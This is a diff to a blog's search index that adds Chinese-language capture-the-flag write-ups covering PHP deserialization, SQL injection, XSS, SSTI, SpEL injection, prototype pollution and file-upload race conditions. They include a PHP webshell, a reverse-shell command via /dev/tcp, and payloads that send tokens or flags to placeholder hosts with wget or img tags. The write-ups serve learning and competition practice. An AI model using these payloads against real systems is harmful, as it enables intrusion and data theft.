@@ -2429,13 +2429,16 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后访问message.php即可</p>
-<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在index页面有一个cookie对session内容的覆盖，而且在check页面包含了inc页面含有一个session处理器的转换，猜测index页面的处理是php</span><br><span class="line">在这里检查的时候会对session进行一次读</span><br><span class="line">所以就是通过cookie的值对session进行覆盖，然后通过这个读取，对session进行反序列化的操作</span><br><span class="line">在index.php页面写入，然后</span><br></pre></td></tr></table></figure>
+<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在index页面有一个cookie对session内容的覆盖，而且在check页面包含了inc页面含有一个session处理器的转换，猜测index页面的处理是php</span><br><span class="line">在这里检查的时候会对session进行一次读</span><br><span class="line">所以就是通过cookie的值对session进行覆盖，然后通过这个读取，对session进行反序列化的操作</span><br><span class="line">在index.php页面写入，然后进入check.php页面进行触发，最后用我们设置额session访问index，这样最后读session的时候就会触发反序列化导致返回我们的结果</span><br></pre></td></tr></table></figure>
 
+<h3 id="web-264"><a href="#web-264" class="headerlink" title="web 264"></a>web 264</h3><p>似乎跟上面你的262没什么不同啊，逃逸一下字符串逃逸27个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-
-
-
-<h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h3 id="web-334"><a href="#web-334" class="headerlink" title="web 334"></a>web 334</h3><p>直接下载源码，判断条件是账号密码正确</p>
+<p>然后传给t就行</p>
+<h3 id="web-265"><a href="#web-265" class="headerlink" title="web 265"></a>web 265</h3><p>需要token与password强等，我们只需要在序列化实例之后让password等于token的地址即可，这样token变化password也会跟随一起变化，所以if永真</p>
+<h3 id="web-266"><a href="#web-266" class="headerlink" title="web 266"></a>web 266</h3><p>直接实例化一下然后序列化以post直接传入即可<code>file_get_contents(php://input)</code>它会将post传参直接复制给cs</p>
+<p>而这里只需要检测到ctfshow就触发error类，但是她会将反序列化的结果作为报错回显，直接看回显即可</p>
+<h3 id="web-267"><a href="#web-267" class="headerlink" title="web 267"></a>web 267</h3><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h3 id="web-334"><a href="#web-334" class="headerlink" title="web 334"></a>web 334</h3><p>直接下载源码，判断条件是账号密码正确</p>
 <p>给出了账号密码：CTFSHOW  123456</p>
 <p>账号会经过一层过滤，将小写转换成大写，直接输入ctfshow  123456登录即可</p>
 <h3 id="web-335"><a href="#web-335" class="headerlink" title="web 335"></a>web 335</h3><p>查看源码发现<code>/?eval=</code></p>
@@ -3635,6 +3638,130 @@ payload:
 ]]></content>
       <tags>
         <tag>tamuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DASCTF防疫挑战赛复现</title>
+    <url>/2022/04/27/DASCTF%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="DASCTF防疫挑战赛复现"><a href="#DASCTF防疫挑战赛复现" class="headerlink" title="DASCTF防疫挑战赛复现"></a>DASCTF防疫挑战赛复现</h1><h2 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>页面主要是遍历class文件动态调用其中的类，设置成员变量，最后执行类的run方法</p>
+<p>Base作为基类，listView以及Filter继承自Base，而TestView继承自Listview类</p>
+<p>所以一般来说应该就是实例化TestView</p>
+<p>先找找漏洞点，有没有可以执行的命令的地方</p>
+<p><img src="/2022/04/27/DASCTF%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
+<p>发现在base类中的evaluateExpression返回时会执行一个eval</p>
+<p>找到漏洞点，就可以区寻找利用链，因为调用了run方法所以先找到run方法</p>
+<p><img src="/2022/04/27/DASCTF%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/2.png" alt="1"></p>
+<p>发现他调用了renderContent()</p>
+<p>跟进这个方法</p>
+<p><img src="/2022/04/27/DASCTF%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/3.png" alt="1"></p>
+<p>发现$this-&gt;template必须是{asdkf}的形式才能够被匹配到调用renderSection函数，此函数会拼接方法名，然后调用</p>
+<p><img src="/2022/04/27/DASCTF%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/4.png" alt="1"></p>
+<p>$matches[1]就是我们输入的{内容}再$this-&gt;$method()调用它</p>
+<p>找到我们最后可以调用到Base中漏洞的类方法renderTableRow发现是由renderTableBody调用的，所以我们直接就由拼接这里拼接到renderTableBody</p>
+<p>然后进入到renderTableRow最后进入evaluateExpression执行eval</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=TestView</span><br><span class="line"></span><br><span class="line">propertiesp[rowHtmlOptionsExpression]=命令&amp;properties[template]=TableBody&amp;properties[data][0]=1</span><br></pre></td></tr></table></figure>
+
+<p>执行一个反弹shell即可</p>
+]]></content>
+      <tags>
+        <tag>DASCTF四月</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MRCTF复现</title>
+    <url>/2022/04/27/MRCTF%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="MRCTF复现"><a href="#MRCTF复现" class="headerlink" title="MRCTF复现"></a>MRCTF复现</h1><h2 id="God-of-GPA"><a href="#God-of-GPA" class="headerlink" title="God_of_GPA"></a>God_of_GPA</h2><p>可以看到有两个页面，博人课堂以及统一身份验证系统</p>
+<p>发现在博人课堂注册登录之后，打开统一身份验证系统的时候她会直接进行跳转，带上token直接登录进个人中心</p>
+<p>小fuzz了一下发现说垃圾话的地方是可以进行xss注入的</p>
+<p>而且在成绩页面：</p>
+<p>有一个专属后门 通道，那么就应该是需要我们拿到管理员的权限，然后进入这个页面才可以拿到flag</p>
+<p>而且在博人课堂里面可以让bot对你发表的垃圾话的uuid进行访问，那么我们可以让他直接带出他的token，然后我们拿到他的token登录是不是就可以了呢</p>
+<p>在测试的时候发现他进行了redirect_uri检测，那么是不是又别的方法进行绕过检测呢，可以进行一个跳板，先发一个跳转，让他跳转到我们的vps，然后我们再创建一个xss让他跳到我们之前创建的vps中，然后这里成功绕过检测，当访问到我们之前的跳板的时候，他就会直接将token带入到vps中就可以拿到flag了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、</span><br><span class="line">&lt;a id=MyImg&gt;&lt;a id=MyImg name=src href=&#x27;cid:ibukifalling&quot;onerror=&quot;javascript:function getQueryVariable(variable)</span><br><span class="line">        &#123;</span><br><span class="line">               var query = window.location.search.substring(1);</span><br><span class="line">               var vars = query.split(`&amp;`);</span><br><span class="line">               for (var i=0;i&lt;vars.length;i++) &#123;</span><br><span class="line">                       var pair = vars[i].split(`=`);</span><br><span class="line">                       if(pair[0] == variable)&#123;return pair[1];&#125;</span><br><span class="line">               &#125;</span><br><span class="line">               return(false);</span><br><span class="line">        &#125;</span><br><span class="line">        var token = getQueryVariable(`token`);</span><br><span class="line">        console.log(token);</span><br><span class="line">        document.write(`&lt;img src=http://yourip/token=`+token+` &gt;`);</span><br><span class="line">        &quot;//&#x27;&gt;&lt;/a&gt;</span><br><span class="line"> 2、</span><br><span class="line"> &lt;a id=MyImg&gt;&lt;a id=MyImg name=src href=&#x27;cid:ibukifalling&quot;onerror=&quot;javascript:setTimeout(function()&#123;location.href=`http://brtserver.node3.mrctf.fun/oauth/authorize?redirect_uri=http://brtclient.node3.mrctf.fun/view/part1uuid`&#125;,1000)&quot;//&#x27;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>赛后看到出题人的wp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不过再仔细试一下会发现只要url部分符合就行了，path部分可以随便填，也就是说redirect_uri=http://brtclient.node3.mrctf.fun/123123这种格式也是可以的</span><br></pre></td></tr></table></figure>
+
+<p>成功以bot身份登录之后再用户名处就可以xss，令bot访问<code>brtserver.node3.mrctf.fun/oauth/authorize</code>就可以拿回管理员权限咯。这样就可以走后门让其中的账号一键满分，然后拿到flag咯</p>
+]]></content>
+      <tags>
+        <tag>MRCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NahamCTF复现</title>
+    <url>/2022/05/02/NahamCTF%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="NahamCTF复现"><a href="#NahamCTF复现" class="headerlink" title="NahamCTF复现"></a>NahamCTF复现</h1><h2 id="Flaskmetal炼金术士"><a href="#Flaskmetal炼金术士" class="headerlink" title="Flaskmetal炼金术士"></a>Flaskmetal炼金术士</h2><p>看了源码发现我们猜测最终执行的语句应该是<strong>select flag from flag</strong></p>
+<p>在页面测试的时候发现，在我们搜索的时候是存在两个post参数的，一个是search，另一个是order</p>
+<p>search很好理解，就直接是搜索字符，而后面的order是判断其排序方式的，虽然在页面上不可更改但当我们抓包的时候发现这里其实是可以按自己的方式更改的，这里可以插入语句，一般的查询语句是肯定不行的，我们需要通过一种排序方式，判断回显来进行盲注：</p>
+<p>可以利用case when then这样的方式来执行我们的判断正确的方式，</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.nahamcon.com:30596&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&#x27;search&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;order&#x27;</span>:<span class="string">f&#x27;(select case when (select substr(flag, 1, 1 from flag) = f then atomic_number else name end)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">io = requests.post(url,data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.text)</span><br></pre></td></tr></table></figure>
+
+<p>这样他就会以不同的判断正确错误的方式来排序这个列表，我们只需要判断第一位就行了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://challenge.nahamcon.com:30596&#x27;</span></span><br><span class="line">arr = ascii_lowercase + <span class="string">&#x27;&#123;&#125;_&#x27;</span></span><br><span class="line">sql = <span class="string">&quot;CASE WHEN (SELECT SUBSTR(flag,&#123;&#125;,1) FROM flag)=&#x27;&#123;&#125;&#x27; THEN atomic_number ELSE symbol END&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> arr:</span><br><span class="line">        response = requests.post(URL, data=&#123; <span class="string">&#x27;search&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;order&#x27;</span>: sql.<span class="built_in">format</span>(index, char) &#125;)</span><br><span class="line">        name = response.text.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">74</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Li&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            flag += char</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hacker-Ts"><a href="#Hacker-Ts" class="headerlink" title="Hacker Ts"></a>Hacker Ts</h2><p>直接让我们在Tshirts上面添加我们写入的语句，没有过滤任何的信息，而且在进入题目的时候很明显的右上角有一个admin</p>
+<p>点进去发现权限不够，所以判断这题就是ssrf，利用利用html语言来访问/admin页面带回输出即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;suff&#x27;&gt;a&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	x = new XMLHttpRequest();</span><br><span class="line">	x.open(&#x27;GET&#x27;,&#x27;http://localhost:5000/admin&#x27;,false);</span><br><span class="line">	x.send();</span><br><span class="line">	document.getElementById(&#x27;suff&#x27;).innerHTML=x.responseText;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>即可在衣服上带回flag</p>
+<h2 id="Deafcon"><a href="#Deafcon" class="headerlink" title="Deafcon"></a>Deafcon</h2><p>在页面随意登录的时候发现在服务器回显了我们输入的内容，简单测试发现了一个ssti漏洞</p>
+<p>但是好像以符号起手的都不行，看到师傅们的wp发现原来可以用request.application这种方法来开头寻找到我们需要的库</p>
+<p>通过寻找他的全局变量来找，最后在builtins库里面可以调用import直接调用os库试试</p>
+<p>发现括号不能用，可以用unicode的类括号，可以实现括号的作用。但是还是无法正确运行，最后发现在解析的时候只要@符号的左边用双引号括起来，那么其中的语句就会正确运行（不知道为啥）</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&#123;&#123;request.application[&#x27;__globals__&#x27;].__builtins__.__import__﹙&#x27;os&#x27;﹚.popen﹙&#x27;cat flag.txt&#x27;﹚.read﹙﹚&#125;&#125;&quot;@qq.com</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>NahamCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>crew-uploadz</title>
+    <url>/2022/04/19/crew-uploadz/</url>
+    <content><![CDATA[<h1 id="crewctf-uploadz"><a href="#crewctf-uploadz" class="headerlink" title="crewctf-uploadz"></a>crewctf-uploadz</h1><p>只有一个简单的文件上传页面还回显了一个文件上传的路径</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">file = <span class="string">&quot;.htaccess&quot;</span> <span class="comment">#上传的文件名1</span></span><br><span class="line">file2 = <span class="string">&quot;test.jpg&quot;</span> <span class="comment">#上传的图片</span></span><br><span class="line">path = <span class="string">&quot;storage/app/temp/&quot;</span><span class="comment">#临时目录的路径</span></span><br><span class="line">files = &#123;</span><br><span class="line">            <span class="string">&#x27;uploadedFile&#x27;</span>: (file, <span class="string">&quot;AddType application/x-httpd-php .jpg&quot;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">&#125;<span class="comment">#文件名内容以及形式</span></span><br><span class="line">files2 = &#123;</span><br><span class="line">            <span class="string">&#x27;uploadedFile&#x27;</span>: (file2, <span class="string">&quot;&quot;&quot;&lt;?php if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&#x27;cmd&#x27;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; &#125;?&gt;&quot;&quot;&quot;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">values = &#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Upload Image&#x27;</span>&#125;<span class="comment">#上传文件</span></span><br><span class="line">url = <span class="string">&quot;https://uploadz-web.crewctf-2022.crewc.tf/&quot;</span><span class="comment">#目标地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">performReqs</span>(<span class="params">uploadedFile</span>):</span></span><br><span class="line">        r = requests.post(url, files=uploadedFile,verify=<span class="literal">False</span>,data=values)<span class="comment">#挂代理上传</span></span><br><span class="line">        filename = re.search(<span class="string">&quot;your file in (.*)&lt;&quot;</span>,r.text)<span class="comment">#读取页面回显的上传地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = sys.argv[<span class="number">1</span>]<span class="comment">#接收我们输入的系统命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=performReqs, args=(files,))<span class="comment">#多线程上传文件1</span></span><br><span class="line"></span><br><span class="line">t2 = threading.Thread(target=performReqs, args=(files2,))<span class="comment">#多线程上传文件2</span></span><br><span class="line"></span><br><span class="line">t2.start()</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url+path+<span class="string">&quot;test.jpg?cmd=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cmd), verify=<span class="literal">False</span>)<span class="comment">#以get方式访问上传的文件</span></span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>
+
+<p>直接条件竞争多线程上传的文件即可，不一定成功，多次尝试即可</p>
+<p>主要思路就是上传两个文件一个是解析文件将jpg解析成php，然后执行我们输入的一句话密码即可</p>
+]]></content>
+      <tags>
+        <tag>crewCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网刃杯2022web复现</title>
+    <url>/2022/04/26/%E7%BD%91%E5%88%83%E6%9D%AF2022web%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="网刃杯2022web复现"><a href="#网刃杯2022web复现" class="headerlink" title="网刃杯2022web复现"></a>网刃杯2022web复现</h1><p>打了网刃，只解出两条，现在将另外两条来复现一下</p>
+<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>发现页面是一个下载按钮，指向了download页面get传入的filename，那么思路就应该很清晰了，想办法下载到题目的信息，寻找到web.xml</p>
+<p>一般就存在在/WEB-INF/web.xml中，但是这里找的时候发现是直接在根目录的web.xml中下载到源码</p>
+<p><img src="/2022/04/26/%E7%BD%91%E5%88%83%E6%9D%AF2022web%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
+<p>可以看到，还存在一个/test388路由</p>
+<p>下载到里面的class文件反编译一下</p>
+<p><img src="/2022/04/26/%E7%BD%91%E5%88%83%E6%9D%AF2022web%E5%A4%8D%E7%8E%B0/2.png" alt="1"></p>
+<p>那么可以发现我们可以在test388路由中传入name参数构造我们的payload</p>
+<p>因为这里存在一个spel注入漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SpEL表达式使用</span><br><span class="line">SpEL定界符——#&#123;&#125;</span><br><span class="line"></span><br><span class="line">SpEL使用#&#123;&#125;作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。如果是 #&#123; 开头同时 &#125; 结尾，就会进入到 SPEL 解析</span><br><span class="line"></span><br><span class="line">这里需要注意#&#123;&#125;和$&#123;&#125;的区别：</span><br><span class="line"></span><br><span class="line">#&#123;&#125;就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</span><br><span class="line">$&#123;&#125;主要用于加载外部属性文件中的值，在Spring Boot 很早版本的一个SpEL表达式注入中就是依赖$&#123;&#125;触发的</span><br><span class="line">两者可以混合使用，但是必须#&#123;&#125;在外面，$&#123;&#125;在里面，如#&#123;&#x27;$&#123;&#125;&#x27;&#125;，注意单引号是字符串类型才添加的</span><br></pre></td></tr></table></figure>
+
+<p>需要拼接绕过一下下面的黑名单</p>
+<p>payload（进行一次urlencode即可）:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp;/dev/tcp/ip/端口 0&gt;&amp;1&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><p>这道题终于还是复现出来了，果然还得用师傅的vps才行嗷</p>
+<p>这道题下载到源码发现：</p>
+<p><img src="/2022/04/26/%E7%BD%91%E5%88%83%E6%9D%AF2022web%E5%A4%8D%E7%8E%B0/3.png" alt="1"></p>
+<p>这里运用的是ejs模板引擎，并且存在一个相关类型的克隆函数发现有里面有参数可以污染sourceURL直接在里面污染即可</p>
+<p>然后有些过滤，测了一下，外带数据即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;__proto__&quot;:&#123;	&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;wg&#x27;+&#x27;et$&#123;IFS&#125;http://vps:端口/`ta\&quot;\&quot;c$&#123;IFS&#125;/.fl\&quot;\&quot;ag`&#x27;)&quot;		</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>网刃杯</tag>
       </tags>
   </entry>
 </search>
